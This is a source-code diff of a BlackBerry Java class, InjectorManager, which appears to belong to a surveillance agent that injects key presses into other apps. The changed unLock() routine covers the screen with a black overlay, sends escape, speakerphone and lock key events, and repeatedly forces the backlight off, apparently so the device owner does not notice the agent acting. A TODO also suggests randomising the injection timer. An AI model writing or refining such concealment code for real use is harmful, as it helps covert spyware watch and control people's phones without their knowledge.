@@ -23,6 +23,7 @@ import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.AppListener;
 import blackberry.Device;
+import blackberry.Main;
 import blackberry.Singleton;
 import blackberry.Status;
 import blackberry.debug.Check;
@@ -59,7 +60,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
     private static Debug debug = new Debug("InjectorManager",
             DebugLevel.VERBOSE);
     //#endif
-    
+
     private static InjectorManager instance;
 
     AInjector[] injectors;
@@ -281,43 +282,51 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
      */
     private void unLock() {
         //#ifdef DEBUG
-        debug.trace("unLock: " + ApplicationManager.getApplicationManager().isSystemLocked());
+        debug.trace("unLock: "
+                + ApplicationManager.getApplicationManager().isSystemLocked());
         //#endif
 
-        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-        Utils.sleep(100);
-
         if (status.backlightEnabled()) {
-            //#ifdef DEBUG
-            debug.trace("Backlight still enabled, getHardwareLayout: "
-                    + Keypad.getHardwareLayout());
-            //#endif
-
-            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
-            Utils.sleep(100);
-            KeyInjector.pressRawKeyCode(KEY_LOCK);
-            status.setBacklight(false);
-            Utils.sleep(100);
-            status.setBacklight(false);
-            Utils.sleep(100);
-            status.setBacklight(false);
-            Utils.sleep(500);
-            for (int i = 0; i < 10; i++) {
-                if (status.backlightEnabled()) {
-                    //Backlight.enable(false);
-                    Utils.sleep(500);
-                    //#ifdef DEBUG
-                    debug.trace("unLock: backlight still enabled");
-                    //#endif
-                } else {
-                    break;
-                }
-            }
-
             return;
         }
 
-        //Main.getInstance().showBlackScreen(false); 
+        Main.getInstance().pushBlack();
+        Utils.sleep(500);
+
+        try {
+            if (status.backlightEnabled()) {
+                return;
+            }
+            KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
+            Utils.sleep(300);
+
+            if (status.backlightEnabled()) {
+                //#ifdef DEBUG
+                debug.trace("Backlight still enabled, getHardwareLayout: "
+                        + Keypad.getHardwareLayout());
+                //#endif
+
+                KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+                KeyInjector.pressRawKeyCode(KEY_LOCK);
+                status.setBacklight(false);
+                Utils.sleep(100);
+                status.setBacklight(false);
+                for (int i = 0; i < 10; i++) {
+                    if (status.backlightEnabled()) {
+                        //Backlight.enable(false);
+                        Utils.sleep(500);
+                        //#ifdef DEBUG
+                        debug.trace("unLock: backlight still enabled");
+                        //#endif
+                    } else {
+                        break;
+                    }
+                }
+
+            }
+        } finally {
+            Main.getInstance().popBlack();
+        }
     }
 
     private boolean checkForeground(String codname) {
@@ -609,7 +618,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
             applicationTimer = new Timer();
             RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
-
+            //TODO: Random(11,30) * 1000
             applicationTimer.schedule(task, 11000, Integer.MAX_VALUE);
         } else {
             if (foreInterestApp) {
